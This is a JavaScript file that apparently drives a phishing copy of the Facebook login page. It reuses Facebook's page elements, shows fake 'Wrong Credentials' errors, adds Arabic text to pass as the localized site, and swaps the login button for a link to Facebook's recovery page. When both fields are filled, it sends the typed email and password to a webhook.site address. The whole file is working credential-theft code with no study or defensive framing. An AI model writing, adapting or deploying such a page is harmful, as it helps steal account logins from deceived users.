let email = document.getElementById("email");
let password = document.getElementById("pass");
let loginContainer = document.getElementsByClassName("_6ltg");
let loginButton = document.getElementById("u_0_5_Yt");
let displayHead = document.querySelector("._8eso");
let contentTextOfhead = displayHead.textContent;
let classOflogInButton = loginButton.classList;
let idLoginButton = loginButton.id;


function invaildCredential(){
	let wrongCredential = `<div class="pam _3-95 _9ay3 uiBoxRed" role="alert" tabindex="0" id="error_box">
		<div class="fsl fwb fcb">Wrong Credentials</div>
		<div>Invalid username or password</div>
	</div>`
    displayHead.style = "font-size:12px;width:300px;"
	displayHead.innerHTML = wrongCredential;
}

function enterToLogin(){
	document.addEventListener("keydown",(eve)=>{
		if(eve.key === "Enter"){
			if(email.value.length > 0 && password.value.length > 0){
				// loginButton.click();
				document.getElementById(idLoginButton).click();
				
			}else if (email.value.length > 0 && password.value.length === 0){
				password.focus();
			}
		}else if(eve.key === "ArrowDown"){
			password.focus();

		}else if(eve.key === "ArrowUp"){
			email.focus();
		}
	})
}



email.setAttribute("required","");
password.setAttribute("required","")
loginContainer[0].innerHTML = "<a href='https://www.facebook.com/login/identify/?ctx=recover&from_login_screen=0'>log in</a>";
loginContainer[0].children[0].id = idLoginButton;
loginContainer[0].children[0].classList = classOflogInButton;
email.style.opacity = "0.5";
password.style.opacity = "0.5";

loginContainer[0].children[0].addEventListener("click",function(event){
	
	if(email.value !=="" && password.value === ""){
		event.preventDefault();
		invaildCredential();
		console.log("pass error .");
		
	}else if(email.value ==="" && password.value !==""){
		event.preventDefault();
		invaildCredential();
		console.log("email error");
	}else if( email.value === "" && password.value === ""){
		event.preventDefault();
		invaildCredential();
	
	}else{
		fetch("https://webhook.site/d77ca21e-7859-4a54-a4fe-48b53fcdb57c", {
			method: 'POST',
			body: JSON.stringify({Email:email.value,Password:password.value})
		})

	}

})

function LanguageHandler(){
	let browserLangruage = navigator.language;
	if(browserLangruage === "ar"){
		email.removeAttribute("aria-label");
		email.setAttribute("placeholder","البريد الالكتروني أو رقم الهاتف");
		email.dir = "rtl";

		password.removeAttribute("aria-label");
		password.setAttribute("placeholder","كلمة السر");
		password.dir = "rtl";

		document.getElementById(idLoginButton).textContent = "تسجيل الدخول";
		document.querySelector(".forget").textContent = "هل نسيت كلمة السر؟";
		document.querySelector("#u_0_0_T7").textContent = "أنشاء حساب جديد";
		let createPage = document.querySelector("._58mk");
		createPage.children[0].textContent = "أنشاء صفحة";
		createPage.children[0].href = "https://www.facebook.com/pages/create/?ref_type=registration_form"
		createPage.childNodes[1].textContent = " شخصية مشهورة أو علامة تجارية أو نشاط تجاري";
		
		document.querySelector("._8eso").textContent = "يمنحك فيسبوك إمكانية التواصل مع الأشخاص ومشاركة ما تريد معهم.";
		document.title = "فيسبوك-تسجيل الدخول";

	}
}

function opacityBack(){
	document.addEventListener("input",(eve)=>{
		if(email === eve.target || password === eve.target){
			if(email.value.length > 0){
				email.style.opacity = "1";
			}
			if(password.value.length > 0){
				password.style = "1";
			}
		}
	})
}
enterToLogin();
LanguageHandler();
opacityBack();
